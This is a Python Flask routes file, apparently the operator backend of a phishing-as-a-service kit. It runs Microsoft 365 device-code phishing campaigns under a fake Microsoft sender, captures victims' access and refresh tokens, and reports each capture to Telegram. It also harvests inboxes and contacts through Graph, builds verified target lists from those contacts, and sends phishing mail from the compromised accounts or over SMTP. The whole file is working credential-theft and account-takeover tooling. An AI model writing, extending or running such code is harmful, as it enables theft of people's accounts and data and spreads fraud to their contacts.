# app/routes/operator.py
from flask import Blueprint, render_template, request, jsonify, flash, redirect, url_for, current_app
from flask_login import login_required, current_user
from app.routes.auth import operator_required
from app.extensions import db
from app.models import Campaign, Victim, HarvestedEmail, B2BLead, DraftEmail, User, KeywordRule, Tenant
from app.engine.device_code import get_device_code, poll_for_token
from app.engine.harvester import EmailHarvester
from app.engine.sorter import EmailSorter
from app.engine.verifier import EmailVerifier
from app.engine.draft_composer import DraftComposer
from app.engine.templates import TEMPLATES, get_categories, get_template
import json
import requests
from datetime import datetime, timedelta
from app.utils.notify import send_telegram, send_email_smtp

import base64
from cryptography.fernet import Fernet

operator_bp = Blueprint('operator', __name__)

# ============================================================
# ENCRYPTION HELPERS
# ============================================================
def get_cipher():
    key = current_app.config['SECRET_KEY']
    key = key.ljust(32)[:32]
    key_bytes = base64.urlsafe_b64encode(key.encode())
    return Fernet(key_bytes)

def encrypt_text(text):
    if not text:
        return None
    cipher = get_cipher()
    return cipher.encrypt(text.encode()).decode()

def decrypt_text(encrypted):
    if not encrypted:
        return None
    cipher = get_cipher()
    return cipher.decrypt(encrypted.encode()).decode()

# ============================================================
# HELPER: Get data scope based on role
# ============================================================
def get_operator_scope():
    """
    Returns a dict with queries filtered by tenant unless user is admin.
    Admin sees everything.
    """
    if current_user.role == 'admin':
        return {
            'campaigns': Campaign.query,
            'victims': Victim.query,
            'harvested': HarvestedEmail.query,
            'leads': B2BLead.query,
            'drafts': DraftEmail.query,
            'users': User.query,
            'keywords': KeywordRule.query
        }
    else:
        tenant_id = current_user.tenant_id
        return {
            'campaigns': Campaign.query.filter_by(tenant_id=tenant_id),
            'victims': Victim.query.join(Campaign).filter(Campaign.tenant_id == tenant_id),
            'harvested': HarvestedEmail.query.join(Victim).join(Campaign).filter(Campaign.tenant_id == tenant_id),
            'leads': B2BLead.query.join(Campaign).filter(Campaign.tenant_id == tenant_id),
            'drafts': DraftEmail.query.join(Campaign).filter(Campaign.tenant_id == tenant_id),
            'users': User.query.filter_by(tenant_id=tenant_id),
            'keywords': KeywordRule.query.filter_by(tenant_id=tenant_id)
        }

# ============================================================
# DASHBOARD
# ============================================================
@operator_bp.route('/dashboard')
@login_required
@operator_required
def dashboard():
    scope = get_operator_scope()
    campaigns = scope['campaigns'].all()
    victims = scope['victims'].all()
    harvested = scope['harvested'].all()
    leads = scope['leads'].all()
    drafts = scope['drafts'].order_by(DraftEmail.created_at.desc()).limit(20).all()
    keywords = scope['keywords'].all()

    provider_counts = {}
    for h in harvested:
        provider_counts[h.provider] = provider_counts.get(h.provider, 0) + 1

    recent_victims = Victim.query.filter(
        Victim.id.in_([v.id for v in victims]),
        Victim.access_token.isnot(None)
    ).order_by(Victim.id.desc()).limit(10).all()

    return render_template(
        'operator_dashboard.html',
        campaigns=campaigns,
        total_campaigns=len(campaigns),
        total_victims=len(victims),
        total_tokens=sum(1 for v in victims if v.access_token),
        total_harvested=len(harvested),
        total_leads=len(leads),
        total_drafts=len(drafts),
        recent_victims=recent_victims,
        provider_counts=provider_counts,
        leads=leads,
        drafts=drafts,
        templates=TEMPLATES,
        categories=get_categories(),
        admin_telegram_handle="YourAdminHandle",
        now=datetime.utcnow(),
        keywords=keywords
    )

# ============================================================
# CAMPAIGN MANAGEMENT
# ============================================================
@operator_bp.route('/campaign/new', methods=['POST'])
@login_required
@operator_required
def create_campaign():
    name = request.form.get('name')
    template_id = request.form.get('template_id', 'ms_alert')
    sender_name = request.form.get('sender_name', '').strip()
    document_title = request.form.get('document_title', '').strip()
    document_type = request.form.get('document_type', '.PDF')
    exit_url = request.form.get('exit_url', 'https://www.microsoft.com')
    language = request.form.get('language', 'English')
    token_type = request.form.get('token_type', 'B2B (Office)')

    if not name:
        template = get_template(template_id)
        name = template['name'] if template else 'Untitled Lure'

    template = get_template(template_id)
    if template:
        if not sender_name:
            sender_name = template.get('default_sender', 'Microsoft Security Team')
        if not document_title:
            document_title = template.get('default_title', template.get('name', 'Document'))

    if not name:
        flash('Campaign name required', 'danger')
        return redirect(url_for('operator.dashboard'))

    tenant_id = current_user.tenant_id
    if current_user.role == 'admin' and not tenant_id:
        first_tenant = Tenant.query.first()
        if first_tenant:
            tenant_id = first_tenant.id
        else:
            flash('No tenant available. Please create a tenant first.', 'danger')
            return redirect(url_for('operator.dashboard'))

    campaign = Campaign(
        name=name,
        tenant_id=tenant_id,
        status='active',
        template_id=template_id,
        sender_name=sender_name,
        document_title=document_title,
        document_type=document_type,
        exit_url=exit_url,
        language=language,
        token_type=token_type
    )
    db.session.add(campaign)
    db.session.commit()

    try:
        code_data = get_device_code()
        victim = Victim(
            campaign_id=campaign.id,
            user_code=code_data['user_code'],
            device_code=code_data['device_code'],
            status='pending'
        )
        db.session.add(victim)
        db.session.commit()
        flash(f'Campaign created! Device code: {code_data["user_code"]}', 'success')
    except Exception as e:
        flash(f'Error generating device code: {e}', 'danger')
    return redirect(url_for('operator.dashboard'))

# ============================================================
# VICTIM ACTIONS (admin aware via scope)
# ============================================================
@operator_bp.route('/victim/<int:victim_id>/poll')
@login_required
@operator_required
def poll_victim(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    scope = get_operator_scope()
    if victim not in scope['victims'].all():
        return jsonify({'error': 'Unauthorized'}), 403

    token_data = poll_for_token(victim.device_code)
    if token_data:
        victim.access_token = token_data.get('access_token')
        victim.refresh_token = token_data.get('refresh_token')
        victim.status = 'completed'
        try:
            headers = {"Authorization": f"Bearer {victim.access_token}"}
            resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
            if resp.status_code == 200:
                victim.email = resp.json().get('mail') or resp.json().get('userPrincipalName')
        except:
            pass
        db.session.commit()
        campaign = victim.campaign
        tenant = campaign.tenant
        if tenant and tenant.telegram_bot_token and tenant.telegram_chat_id:
            msg = (f"✅ New victim captured!\nVictim ID: {victim.id}\nEmail: {victim.email or 'Unknown'}\nCampaign: {campaign.name}\nTenant: {tenant.name}")
            send_telegram(tenant.telegram_bot_token, tenant.telegram_chat_id, msg)
        return jsonify({'status': 'success', 'token': victim.access_token[:20] + '...'})
    else:
        return jsonify({'status': 'pending', 'message': 'Not yet authenticated'})

@operator_bp.route('/victim/<int:victim_id>/harvest')
@login_required
@operator_required
def harvest(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    scope = get_operator_scope()
    if victim not in scope['victims'].all():
        return jsonify({'error': 'Unauthorized'}), 403
    if not victim.access_token:
        return jsonify({'error': 'No token available'}), 400

    harvester = EmailHarvester(victim.access_token)
    try:
        emails = harvester.harvest_inbox(limit=100)
        contacts = harvester.harvest_contacts()
    except Exception as e:
        return jsonify({'error': str(e)}), 500

    harvested_count = 0
    for email in emails:
        sender = email.get('sender', {}).get('emailAddress', {}).get('address', '')
        recipient = email.get('toRecipients', [{}])[0].get('emailAddress', {}).get('address', '')
        provider = EmailSorter.classify(sender)
        h = HarvestedEmail(
            victim_id=victim.id,
            sender=sender,
            recipient=recipient,
            subject=email.get('subject', ''),
            body_preview=email.get('bodyPreview', ''),
            received_date=email.get('receivedDateTime'),
            provider=provider,
            verification_score=0,
            is_verified=False
        )
        db.session.add(h)
        harvested_count += 1
    db.session.commit()

    for contact in contacts:
        email = contact.get('emailAddresses', [{}])[0].get('address')
        if email:
            existing = B2BLead.query.filter_by(target_email=email, campaign_id=victim.campaign_id).first()
            if not existing:
                lead = B2BLead(
                    campaign_id=victim.campaign_id,
                    target_email=email,
                    provider=EmailSorter.classify(email),
                    verification_score=0,
                    is_contacted=False
                )
                db.session.add(lead)
    db.session.commit()
    return jsonify({'status': 'done', 'harvested': harvested_count, 'contacts': len(contacts)})

# ============================================================
# CAMPAIGN PROCESSING (admin aware)
# ============================================================
@operator_bp.route('/campaign/<int:campaign_id>/process')
@login_required
@operator_required
def process_campaign(campaign_id):
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        scope = get_operator_scope()
        if campaign not in scope['campaigns'].all():
            return jsonify({'error': 'Unauthorized'}), 403

        victims = Victim.query.filter_by(campaign_id=campaign.id).all()
        victim_ids = [v.id for v in victims]
        if not victim_ids:
            return jsonify({
                'status': 'done',
                'total_harvested': 0,
                'unique_senders': 0,
                'verified_leads': 0,
                'provider_groups': {}
            })

        harvested = HarvestedEmail.query.filter(HarvestedEmail.victim_id.in_(victim_ids)).all()
        unique_senders = set()
        for h in harvested:
            if h.sender:
                unique_senders.add(h.sender)

        provider_groups = EmailSorter.sort_batch(list(unique_senders))
        verified_results = EmailVerifier.verify_batch(list(unique_senders))

        leads_created = 0
        for res in verified_results['valid']:
            email = res['email']
            provider = EmailSorter.classify(email)
            existing = B2BLead.query.filter_by(target_email=email, campaign_id=campaign.id).first()
            if not existing:
                lead = B2BLead(
                    campaign_id=campaign.id,
                    target_email=email,
                    provider=provider,
                    verification_score=res['score'],
                    is_contacted=False
                )
                db.session.add(lead)
                leads_created += 1
        db.session.commit()

        return jsonify({
            'status': 'done',
            'total_harvested': len(harvested),
            'unique_senders': len(unique_senders),
            'verified_leads': leads_created,
            'provider_groups': provider_groups
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
# LEADS (admin aware)
# ============================================================
@operator_bp.route('/campaign/<int:campaign_id>/leads')
@login_required
@operator_required
def get_leads(campaign_id):
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        scope = get_operator_scope()
        if campaign not in scope['campaigns'].all():
            return jsonify({'error': 'Unauthorized'}), 403

        leads = B2BLead.query.filter_by(campaign_id=campaign.id).all()
        data = [{
            'id': l.id,
            'email': l.target_email,
            'provider': l.provider,
            'score': l.verification_score,
            'contacted': l.is_contacted,
            'verified': l.is_verified
        } for l in leads]
        return jsonify(data)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
# CAMPAIGN DELETE / TOGGLE (admin aware)
# ============================================================
@operator_bp.route('/campaign/<int:campaign_id>/delete', methods=['POST'])
@login_required
@operator_required
def delete_campaign(campaign_id):
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        scope = get_operator_scope()
        if campaign not in scope['campaigns'].all():
            return jsonify({'error': 'Unauthorized'}), 403

        victims = Victim.query.filter_by(campaign_id=campaign.id).all()
        for victim in victims:
            HarvestedEmail.query.filter_by(victim_id=victim.id).delete()
            B2BLead.query.filter_by(campaign_id=campaign.id).delete()
            DraftEmail.query.filter_by(campaign_id=campaign.id).delete()
            db.session.delete(victim)

        db.session.delete(campaign)
        db.session.commit()
        return jsonify({'status': 'success', 'message': 'Campaign deleted'})
    except Exception as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500

@operator_bp.route('/campaign/<int:campaign_id>/toggle', methods=['POST'])
@login_required
@operator_required
def toggle_campaign(campaign_id):
    try:
        campaign = Campaign.query.get_or_404(campaign_id)
        scope = get_operator_scope()
        if campaign not in scope['campaigns'].all():
            return jsonify({'error': 'Unauthorized'}), 403

        campaign.status = 'inactive' if campaign.status == 'active' else 'active'
        db.session.commit()
        return jsonify({'status': campaign.status, 'message': f'Campaign is now {campaign.status}'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@operator_bp.route('/campaign/<int:campaign_id>/device_codes')
@login_required
@operator_required
def get_device_codes(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    scope = get_operator_scope()
    if campaign not in scope['campaigns'].all():
        return jsonify({'error': 'Unauthorized'}), 403
    victims = Victim.query.filter_by(campaign_id=campaign.id).all()
    data = [{
        'id': v.id,
        'user_code': v.user_code,
        'device_code': v.device_code[:10] + '...' if v.device_code else 'N/A',
        'status': v.status,
        'email': v.email or 'Unknown'
    } for v in victims]
    return jsonify(data)

# ============================================================
# CLASSIFY (admin aware)
# ============================================================
@operator_bp.route('/classify/<int:victim_id>')
@login_required
@operator_required
def classify_victim(victim_id):
    victim = Victim.query.get_or_404(victim_id)
    scope = get_operator_scope()
    if victim not in scope['victims'].all():
        return jsonify({'error': 'Unauthorized'}), 403

    campaign = victim.campaign
    victims = Victim.query.filter_by(campaign_id=campaign.id).all()
    victim_ids = [v.id for v in victims]
    harvested = HarvestedEmail.query.filter(HarvestedEmail.victim_id.in_(victim_ids)).all()
    senders = set()
    for h in harvested:
        if h.sender:
            senders.add(h.sender)
    provider_groups = {}
    for sender in senders:
        provider = EmailSorter.classify(sender)
        if provider not in provider_groups:
            provider_groups[provider] = []
        provider_groups[provider].append(sender)
    return jsonify(provider_groups)

# ============================================================
# DRAFT OPERATIONS (admin aware)
# ============================================================
@operator_bp.route('/draft/compose', methods=['POST'])
@login_required
@operator_required
def compose_draft():
    campaign_id = request.form.get('campaign_id')
    victim_id = request.form.get('victim_id')
    to_email = request.form.get('to_email')
    category = request.form.get('category', 'invoice')
    context = json.loads(request.form.get('context', '{}'))

    campaign = Campaign.query.get_or_404(campaign_id)
    scope = get_operator_scope()
    if campaign not in scope['campaigns'].all():
        return jsonify({'error': 'Unauthorized'}), 403

    victim = Victim.query.get_or_404(victim_id)
    if victim.campaign_id != campaign.id:
        return jsonify({'error': 'Victim not in campaign'}), 400

    draft = DraftComposer.generate_draft(
        campaign_id=campaign.id,
        victim_id=victim.id,
        to_email=to_email,
        category=category,
        context=context
    )
    return jsonify({
        'draft_id': draft.id,
        'subject': draft.subject,
        'body': draft.body,
        'ai_generated': draft.ai_generated,
        'status': draft.status
    })

@operator_bp.route('/draft/<int:draft_id>/edit', methods=['POST'])
@login_required
@operator_required
def edit_draft(draft_id):
    draft = DraftEmail.query.get_or_404(draft_id)
    campaign = Campaign.query.get(draft.campaign_id)
    scope = get_operator_scope()
    if campaign not in scope['campaigns'].all():
        return jsonify({'error': 'Unauthorized'}), 403

    new_subject = request.form.get('subject')
    new_body = request.form.get('body')
    if DraftComposer.edit_draft(draft_id, new_subject, new_body):
        return jsonify({'status': 'edited'})
    return jsonify({'error': 'Cannot edit'}), 400

@operator_bp.route('/draft/<int:draft_id>/send')
@login_required
@operator_required
def send_draft(draft_id):
    draft = DraftEmail.query.get_or_404(draft_id)
    campaign = Campaign.query.get(draft.campaign_id)
    scope = get_operator_scope()
    if campaign not in scope['campaigns'].all():
        return jsonify({'error': 'Unauthorized'}), 403

    victim = Victim.query.get(draft.from_victim_id)
    if not victim or not victim.access_token:
        return jsonify({'error': 'Victim token missing'}), 400
    if DraftComposer.send_draft(draft_id, victim.access_token):
        return jsonify({'status': 'sent'})
    return jsonify({'error': 'Failed to send'}), 500

@operator_bp.route('/drafts')
@login_required
@operator_required
def get_drafts():
    scope = get_operator_scope()
    drafts = scope['drafts'].order_by(DraftEmail.created_at.desc()).limit(20).all()
    data = [{
        'id': d.id,
        'to_email': d.to_email,
        'subject': d.subject,
        'body_preview': d.body[:100] + '...' if d.body else '',
        'status': d.status,
        'created_at': d.created_at.strftime('%Y-%m-%d %H:%M'),
        'ai_generated': d.ai_generated
    } for d in drafts]
    return jsonify(data)

# ============================================================
# KEYWORD, DOMAIN, TELEGRAM SETTINGS (admin aware)
# ============================================================
@operator_bp.route('/keyword/add', methods=['POST'])
@login_required
@operator_required
def add_keyword():
    keyword = request.form.get('keyword', '').strip()
    category = request.form.get('category', 'general').strip()
    if not keyword:
        flash('❌ Please enter a keyword.', 'danger')
    else:
        tenant_id = current_user.tenant_id
        # Save to DB
        new_kw = KeywordRule(tenant_id=tenant_id, keyword=keyword, category=category)
        db.session.add(new_kw)
        db.session.commit()
        flash(f'✅ Keyword "{keyword}" added to category "{category}".', 'success')
    return redirect(url_for('operator.dashboard'))

@operator_bp.route('/keyword/delete/<int:kw_id>', methods=['POST'])
@login_required
@operator_required
def delete_keyword(kw_id):
    kw = KeywordRule.query.get_or_404(kw_id)
    if kw.tenant_id != current_user.tenant_id and current_user.role != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403
    db.session.delete(kw)
    db.session.commit()
    flash('Keyword deleted.', 'success')
    return redirect(url_for('operator.dashboard'))

@operator_bp.route('/domain/add', methods=['POST'])
@login_required
@operator_required
def add_domain():
    domain = request.form.get('domain', '').strip()
    if not domain:
        flash('❌ Please enter a domain.', 'danger')
    else:
        flash(f'✅ Domain "{domain}" added.', 'success')
    return redirect(url_for('operator.dashboard'))

@operator_bp.route('/telegram/update', methods=['POST'])
@login_required
@operator_required
def update_telegram():
    bot_token = request.form.get('bot_token', '').strip()
    chat_id = request.form.get('chat_id', '').strip()
    if bot_token and chat_id:
        # Update tenant settings
        tenant = current_user.tenant
        if tenant:
            tenant.telegram_bot_token = bot_token
            tenant.telegram_chat_id = chat_id
            db.session.commit()
            flash('✅ Telegram settings saved!', 'success')
        else:
            flash('No tenant associated with your account.', 'danger')
    else:
        flash('⚠️ Please provide both Bot Token and Chat ID.', 'warning')
    return redirect(url_for('operator.dashboard'))

# ============================================================
# TOKEN IMPORT (admin aware)
# ============================================================
@operator_bp.route('/token/import', methods=['POST'])
@login_required
@operator_required
def import_token():
    token = request.form.get('token', '').strip()
    email = request.form.get('email', '').strip()
    if not token:
        flash('❌ Please paste a token.', 'danger')
        return redirect(url_for('operator.dashboard'))

    scope = get_operator_scope()
    campaign = scope['campaigns'].first()
    if not campaign:
        tenant_id = current_user.tenant_id
        if current_user.role == 'admin' and not tenant_id:
            tenant = Tenant.query.first()
            if tenant:
                tenant_id = tenant.id
            else:
                flash('No tenant available.', 'danger')
                return redirect(url_for('operator.dashboard'))
        campaign = Campaign(name='Imported Tokens', tenant_id=tenant_id, status='active')
        db.session.add(campaign)
        db.session.commit()

    victim = Victim(
        campaign_id=campaign.id,
        access_token=token,
        email=email or 'imported@unknown.com',
        status='completed',
        user_code='IMPORTED'
    )
    db.session.add(victim)
    db.session.commit()
    flash(f'✅ Token imported! Victim ID: {victim.id}', 'success')
    return redirect(url_for('operator.dashboard'))

# ============================================================
# EXTRACT, SORT, VERIFY, B2B (admin aware)
# ============================================================
@operator_bp.route('/extract', methods=['POST'])
@login_required
@operator_required
def operator_extract():
    keyword = request.form.get('keyword', '').strip()
    if not keyword:
        flash('❌ Please enter a keyword.', 'danger')
        return redirect(url_for('operator.dashboard'))

    scope = get_operator_scope()
    victims = scope['victims'].filter(Victim.access_token.isnot(None)).all()
    matching_victims = [v for v in victims if keyword.lower() in (v.email or '').lower()]
    if not matching_victims:
        flash(f'❌ No victims with "{keyword}".', 'warning')
        return redirect(url_for('operator.dashboard'))

    total_harvested = 0
    total_leads_created = 0
    for victim in matching_victims:
        harvester = EmailHarvester(victim.access_token)
        try:
            emails = harvester.harvest_inbox(limit=50)
            contacts = harvester.harvest_contacts()
        except:
            continue
        for email in emails:
            sender = email.get('sender', {}).get('emailAddress', {}).get('address', '')
            recipient = email.get('toRecipients', [{}])[0].get('emailAddress', {}).get('address', '')
            provider = EmailSorter.classify(sender)
            h = HarvestedEmail(
                victim_id=victim.id,
                sender=sender,
                recipient=recipient,
                subject=email.get('subject', ''),
                body_preview=email.get('bodyPreview', ''),
                received_date=email.get('receivedDateTime'),
                provider=provider,
                verification_score=0,
                is_verified=False
            )
            db.session.add(h)
            total_harvested += 1
        for contact in contacts:
            email = contact.get('emailAddresses', [{}])[0].get('address')
            if email:
                existing = B2BLead.query.filter_by(target_email=email, campaign_id=victim.campaign_id).first()
                if not existing:
                    lead = B2BLead(
                        campaign_id=victim.campaign_id,
                        target_email=email,
                        provider=EmailSorter.classify(email),
                        verification_score=0,
                        is_contacted=False
                    )
                    db.session.add(lead)
                    total_leads_created += 1
        db.session.commit()
    flash(f'✅ Extracted {total_harvested} emails, created {total_leads_created} leads from {len(matching_victims)} victims.', 'success')
    return redirect(url_for('operator.dashboard'))

@operator_bp.route('/sort_emails', methods=['POST'])
@login_required
@operator_required
def sort_emails():
    data = request.get_json()
    emails = data.get('emails', [])
    result = {}
    for email in emails:
        provider = EmailSorter.classify(email)
        if provider not in result:
            result[provider] = []
        result[provider].append(email)
    return jsonify(result)

@operator_bp.route('/leads/sort')
@login_required
@operator_required
def sort_leads():
    scope = get_operator_scope()
    leads = scope['leads'].all()
    for lead in leads:
        lead.provider = EmailSorter.classify(lead.target_email)
    db.session.commit()
    flash(f'✅ Sorted {len(leads)} leads by provider.', 'success')
    return redirect(url_for('operator.dashboard'))

@operator_bp.route('/leads/verify')
@login_required
@operator_required
def verify_leads():
    scope = get_operator_scope()
    leads = scope['leads'].all()
    emails_to_verify = [l.target_email for l in leads]
    verified_results = EmailVerifier.verify_batch(emails_to_verify)
    valid_count = 0
    for res in verified_results['valid']:
        lead = B2BLead.query.filter_by(target_email=res['email']).first()
        if lead:
            lead.verification_score = res['score']
            lead.is_verified = True
            valid_count += 1
    for res in verified_results['invalid']:
        lead = B2BLead.query.filter_by(target_email=res['email']).first()
        if lead:
            db.session.delete(lead)
    db.session.commit()
    flash(f'✅ Verified: {valid_count} valid, {len(verified_results["invalid"])} removed.', 'success')
    return redirect(url_for('operator.dashboard'))

# ===== B2B SEND WITH METHOD CHOICE (GRAPH or SMTP) =====
@operator_bp.route('/b2b_send', methods=['POST'])
@login_required
@operator_required
def b2b_send():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON'}), 400

    subject = data.get('subject')
    body = data.get('body')
    recipients_raw = data.get('recipients', '')
    recipients = [r.strip() for r in recipients_raw.split('\n') if r.strip()]
    send_method = data.get('method', 'graph').lower()

    if not recipients:
        return jsonify({'error': 'No recipients provided'}), 400

    if send_method == 'smtp':
        # ---- SMTP SENDING ----
        user = current_user

        if user.smtp_enabled and user.smtp_server:
            server = user.smtp_server
            port = user.smtp_port
            username = user.smtp_username
            password = decrypt_text(user.smtp_password) if user.smtp_password else None
            from_email = user.smtp_from_email
            from_name = user.smtp_from_name
            use_tls = user.smtp_use_tls
        else:
            server = current_app.config.get('SMTP_SERVER')
            port = current_app.config.get('SMTP_PORT', 587)
            username = current_app.config.get('SMTP_USERNAME')
            password = current_app.config.get('SMTP_PASSWORD')
            from_email = current_app.config.get('SMTP_FROM_EMAIL')
            from_name = current_app.config.get('SMTP_FROM_NAME', 'Microsoft Security')
            use_tls = current_app.config.get('SMTP_USE_TLS', True)

        if not all([server, username, password, from_email]):
            return jsonify({'error': 'SMTP configuration incomplete. Please set your SMTP settings or contact admin.'}), 400

        success, msg, sent, failed = send_email_smtp(
            recipients, subject, body,
            from_email=from_email, from_name=from_name,
            server=server, port=port, username=username, password=password, use_tls=use_tls
        )

        if success:
            return jsonify({'sent': sent, 'failed': failed, 'total': len(recipients)})
        else:
            return jsonify({'sent': 0, 'failed': recipients, 'total': len(recipients), 'error': msg}), 500

    else:
        # ---- GRAPH SENDING ----
        victim_id = data.get('victim_id')
        if not victim_id:
            return jsonify({'error': 'victim_id required for Graph sending'}), 400

        victim = Victim.query.get_or_404(victim_id)
        scope = get_operator_scope()
        if victim not in scope['victims'].all():
            return jsonify({'error': 'Unauthorized'}), 403

        if not victim.access_token:
            return jsonify({'error': 'Victim token missing'}), 400

        sent_count = 0
        failed = []
        for email in recipients:
            try:
                url = "https://graph.microsoft.com/v1.0/me/sendMail"
                payload = {
                    "message": {
                        "subject": subject,
                        "body": {"contentType": "HTML", "content": body},
                        "toRecipients": [{"emailAddress": {"address": email}}]
                    },
                    "saveToSentItems": "true"
                }
                headers = {"Authorization": f"Bearer {victim.access_token}"}
                resp = requests.post(url, headers=headers, json=payload)
                if resp.status_code == 202:
                    sent_count += 1
                else:
                    failed.append(email)
            except Exception:
                failed.append(email)

        return jsonify({'sent': sent_count, 'failed': failed, 'total': len(recipients)})

# ============================================================
# AI INTELLIGENCE (updated)
# ============================================================
@operator_bp.route('/ai-intelligence')
@login_required
@operator_required
def ai_intelligence():
    return render_template('ai_intelligence.html')

@operator_bp.route('/ai/mode', methods=['POST'])
@login_required
@operator_required
def set_ai_mode():
    data = request.get_json()
    mode = data.get('mode', 'ai')
    tenant = current_user.tenant
    if tenant:
        tenant.alert_mode = mode
        db.session.commit()
        flash(f'✅ AI mode set to: {mode}', 'success')
    return jsonify({'status': 'success', 'mode': mode})

@operator_bp.route('/ai/settings', methods=['POST'])
@login_required
@operator_required
def update_ai_settings():
    provider = request.form.get('provider')
    api_key = request.form.get('api_key')
    model = request.form.get('model')
    risk_threshold = request.form.get('risk_threshold')
    tenant = current_user.tenant
    if tenant:
        if provider:
            tenant.ai_provider = provider
        if api_key:
            tenant.ai_api_key = api_key
        if model:
            tenant.ai_model = model
        if risk_threshold:
            tenant.ai_risk_threshold = int(risk_threshold)
        db.session.commit()
        flash('✅ AI settings saved!', 'success')
    else:
        flash('No tenant found.', 'danger')
    return redirect(url_for('operator.dashboard'))

# ============================================================
# INFRASTRUCTURE (placeholder)
# ============================================================
@operator_bp.route('/infrastructure')
@login_required
@operator_required
def infrastructure():
    return render_template('infrastructure.html')

@operator_bp.route('/vps/connect', methods=['POST'])
@login_required
@operator_required
def operator_connect_vps():
    ip = request.form.get('ip')
    port = request.form.get('port')
    username = request.form.get('username')
    auth_method = request.form.get('auth_method')
    password = request.form.get('password')
    flash('✅ VPS connected successfully! (Demo)', 'success')
    return redirect(url_for('operator.infrastructure'))

# ============================================================
# EXTEND SUBSCRIPTION
# ============================================================
@operator_bp.route('/extend_subscription', methods=['POST'])
@login_required
@operator_required
def extend_subscription():
    flash('Extension request sent to admin. You will be contacted.', 'info')
    return jsonify({'message': 'Extension request sent.'})

# ============================================================
# USER SMTP SETTINGS (for current user)
# ============================================================
@operator_bp.route('/smtp/settings', methods=['POST'])
@login_required
@operator_required
def save_smtp_settings():
    data = request.get_json()
    user = current_user

    user.smtp_enabled = data.get('enabled', False)
    user.smtp_server = data.get('server', '').strip()
    user.smtp_port = int(data.get('port', 587))
    user.smtp_username = data.get('username', '').strip()
    raw_password = data.get('password', '').strip()
    user.smtp_password = encrypt_text(raw_password) if raw_password else None
    user.smtp_from_email = data.get('from_email', '').strip()
    user.smtp_from_name = data.get('from_name', '').strip()
    user.smtp_use_tls = data.get('use_tls', True)

    db.session.commit()
    return jsonify({'status': 'success', 'message': 'SMTP settings saved successfully.'})

@operator_bp.route('/smtp/test', methods=['POST'])
@login_required
@operator_required
def test_smtp():
    user = current_user
    server = user.smtp_server
    port = user.smtp_port
    username = user.smtp_username
    password = decrypt_text(user.smtp_password) if user.smtp_password else None
    from_email = user.smtp_from_email
    from_name = user.smtp_from_name
    use_tls = user.smtp_use_tls

    if not server:
        server = current_app.config.get('SMTP_SERVER')
        port = current_app.config.get('SMTP_PORT', 587)
        username = current_app.config.get('SMTP_USERNAME')
        password = current_app.config.get('SMTP_PASSWORD')
        from_email = current_app.config.get('SMTP_FROM_EMAIL')
        from_name = current_app.config.get('SMTP_FROM_NAME', 'Microsoft Security')
        use_tls = current_app.config.get('SMTP_USE_TLS', True)

    if not all([server, username, password, from_email]):
        return jsonify({'status': 'error', 'message': 'SMTP configuration incomplete. Please set your SMTP settings or contact admin.'}), 400

    test_email = user.email or user.username + '@example.com'
    subject = "SMTP Test from omila365"
    body = f"<p>Hello {user.username},</p><p>This is a test email to verify your SMTP settings.</p><p>Sent at: {datetime.utcnow()}</p>"

    success, msg, sent, failed = send_email_smtp(
        [test_email], subject, body,
        from_email=from_email, from_name=from_name,
        server=server, port=port, username=username, password=password, use_tls=use_tls
    )

    if success:
        return jsonify({'status': 'success', 'message': f'Test email sent to {test_email}'})
    else:
        return jsonify({'status': 'error', 'message': f'Test failed: {msg}'}), 400

@operator_bp.route('/smtp/status')
@login_required
@operator_required
def get_smtp_status():
    user = current_user
    return jsonify({
        'enabled': user.smtp_enabled,
        'server': user.smtp_server,
        'port': user.smtp_port,
        'username': user.smtp_username,
        'from_email': user.smtp_from_email,
        'from_name': user.smtp_from_name,
        'use_tls': user.smtp_use_tls,
        'has_password': bool(user.smtp_password)
    })

# ============================================================
# ADMIN-ONLY SMTP MANAGEMENT (for any user)
# ============================================================
@operator_bp.route('/admin/smtp/<int:user_id>', methods=['GET', 'POST'])
@login_required
@operator_required
def admin_smtp_settings(user_id):
    """Allow admin to view/edit SMTP settings of any user."""
    if current_user.role != 'admin':
        return jsonify({'error': 'Admin access required'}), 403

    user = User.query.get_or_404(user_id)

    if request.method == 'GET':
        return jsonify({
            'enabled': user.smtp_enabled,
            'server': user.smtp_server,
            'port': user.smtp_port,
            'username': user.smtp_username,
            'from_email': user.smtp_from_email,
            'from_name': user.smtp_from_name,
            'use_tls': user.smtp_use_tls,
            'has_password': bool(user.smtp_password)
        })

    data = request.get_json()
    user.smtp_enabled = data.get('enabled', False)
    user.smtp_server = data.get('server', '').strip()
    user.smtp_port = int(data.get('port', 587))
    user.smtp_username = data.get('username', '').strip()
    raw_password = data.get('password', '').strip()
    if raw_password:
        user.smtp_password = encrypt_text(raw_password)
    user.smtp_from_email = data.get('from_email', '').strip()
    user.smtp_from_name = data.get('from_name', '').strip()
    user.smtp_use_tls = data.get('use_tls', True)
    db.session.commit()
    return jsonify({'status': 'success', 'message': 'SMTP settings updated for user.'})

@operator_bp.route('/admin/smtp/<int:user_id>/test', methods=['POST'])
@login_required
@operator_required
def admin_smtp_test(user_id):
    """Allow admin to test SMTP for any user."""
    if current_user.role != 'admin':
        return jsonify({'error': 'Admin access required'}), 403

    user = User.query.get_or_404(user_id)
    server = user.smtp_server
    port = user.smtp_port
    username = user.smtp_username
    password = decrypt_text(user.smtp_password) if user.smtp_password else None
    from_email = user.smtp_from_email
    from_name = user.smtp_from_name
    use_tls = user.smtp_use_tls

    if not all([server, username, password, from_email]):
        return jsonify({'status': 'error', 'message': 'User SMTP configuration incomplete.'}), 400

    test_email = user.email or user.username + '@example.com'
    subject = "SMTP Test (Admin)"
    body = f"<p>Hello {user.username},</p><p>This is a test email sent by admin to verify your SMTP settings.</p>"

    success, msg, sent, failed = send_email_smtp(
        [test_email], subject, body,
        from_email=from_email, from_name=from_name,
        server=server, port=port, username=username, password=password, use_tls=use_tls
    )

    if success:
